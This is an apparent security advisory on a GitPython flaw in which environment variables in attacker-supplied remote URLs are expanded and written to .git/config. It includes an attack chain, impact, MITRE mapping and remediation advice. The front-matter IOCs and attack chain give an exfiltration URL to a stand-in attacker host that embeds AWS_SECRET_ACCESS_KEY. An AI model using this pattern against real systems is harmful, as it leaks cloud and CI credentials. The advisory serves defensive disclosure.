---
title: GitPython Environment Variable Exfiltration via Remote URL Processing
slug: 2026-07-gitpython-env-var-exfil
description: A vulnerability in GitPython allows environment variables to be exfiltrated when using `Repo.create_remote()` or `Remote.add()`, where attacker-supplied URLs are processed by `Git.polish_url()` expanding sensitive environment variables into the URL, which is then stored in `.git/config` and transmitted to an attacker-controlled host.
date: "2026-07-24T21:49:48Z"
type: advisory
types:
  - advisory
severities:
  - high
tags:
  - gitpython
  - supply-chain
  - vulnerability
  - exfiltration
  - data-theft
vendors:
  - GitPython
products:
  - GitPython (<= 3.1.53)
mitre_ttps:
  - tactic_id: TA0009
    tactic_name: Collection
    technique_id: T1552
    technique_name: Unsecured Credentials
    evidence: Any secret in the hosting process environment (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, CI/CD tokens) is disclosed to an attacker...
    confidence_band: high
  - tactic_id: TA0010
    tactic_name: Exfiltration
    technique_id: T1041
    technique_name: Exfiltration Over C2 Channel
    evidence: The secret is expanded into `.git/config` immediately and transmitted over the network (DNS + HTTP) on the next `fetch`/`pull`/`remote update`.
    confidence_band: high
references:
  - https://github.com/advisories/GHSA-94p4-4cq8-9g67
iocs:
  - type: domain
    value: attacker.example
  - type: url
    value: http://attacker.example/${AWS_SECRET_ACCESS_KEY}/repo.git
ioc_counts:
  domain: 1
  url: 1
---

A high-severity vulnerability exists in the GitPython library (versions <= 3.1.53) that allows for the exfiltration of environment variables from the process hosting the library. This issue stems from an incomplete fix for GHSA-rwj8-pgh3-r573. While the prior fix addressed `Repo.clone_from()`, the `Git.polish_url()` function, which defaults to `expand_vars=True`, continues to process attacker-supplied URLs used with `Repo.create_remote()`, `Remote.add()`, and `Submodule.add()`. This allows attackers to embed placeholders like `${AWS_SECRET_ACCESS_KEY}` in remote URLs. When these functions are called, the GitPython library expands these environment variables into the URL, storing the sensitive information directly in `.git/config` or `.gitmodules` files. Subsequently, any Git operation that interacts with this remote (such as `fetch` or `pull`) will transmit the expanded, secret-containing URL to the attacker's server, leading to sensitive data disclosure. This affects applications that import Git repositories from untrusted URLs, such as CI servers, git-hosting mirrors, or dependency scanners.

## Attack Chain

1. An attacker crafts a malicious URL containing an environment variable placeholder, such as `http://attacker.example/${AWS_SECRET_ACCESS_KEY}/repo.git`.
2. The victim's application, utilizing the vulnerable GitPython library, calls `Repo.create_remote()`, `Remote.add()`, or `Submodule.add()` with the attacker-controlled URL.
3. GitPython's internal `Git.polish_url()` function, by default, expands environment variables found in the provided URL.
4. The placeholder (e.g., `${AWS_SECRET_ACCESS_KEY}`) is replaced with the actual value of the environment variable from the victim's process.
5. The now secret-containing URL is written and stored persistently in the `.git/config` file (for `create_remote`/`add`) or `.gitmodules` file (for `Submodule.add`).
6. During a subsequent Git operation, such as `remote.fetch()` or `remote.pull()`, GitPython attempts to establish a connection to the remote using the stored, expanded URL.
7. The secret-containing URL is transmitted over the network (DNS and HTTP requests) to the attacker-controlled host.
8. The attacker's server receives and logs the incoming request, thereby exfiltrating the sensitive environment variable.

## Impact

The successful exploitation of this vulnerability leads to the disclosure of sensitive environment variables, including credentials such as `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, or other CI/CD tokens, to an attacker-controlled remote server. This direct exfiltration of secrets can grant attackers unauthorized access to cloud resources, code repositories, or continuous integration/delivery pipelines, potentially leading to further compromise of the victim's infrastructure. The vulnerability affects applications running GitPython versions 3.1.53 and earlier that process external URLs, particularly those implementing "import repository from URL" features in environments like CI servers or code analysis tools. The disclosure can also occur by writing the expanded URL to `.gitmodules`, a file that might be committed to a repository, potentially broadening the exposure.

## Recommendation

* Upgrade GitPython to a version patched against GHSA-94p4-4cq8-9g67 immediately once available.
* Review all code paths that utilize `Repo.create_remote()`, `Remote.add()`, or `Submodule.add()` with URLs originating from untrusted or external sources.
* Implement robust input validation and sanitization for all URLs passed to GitPython functions to prevent injection of environment variable placeholders.
* Utilize network logging and monitoring for suspicious outbound connections that might contain sensitive environment variables within the URL path, as indicated by the `attacker.example` IOC.
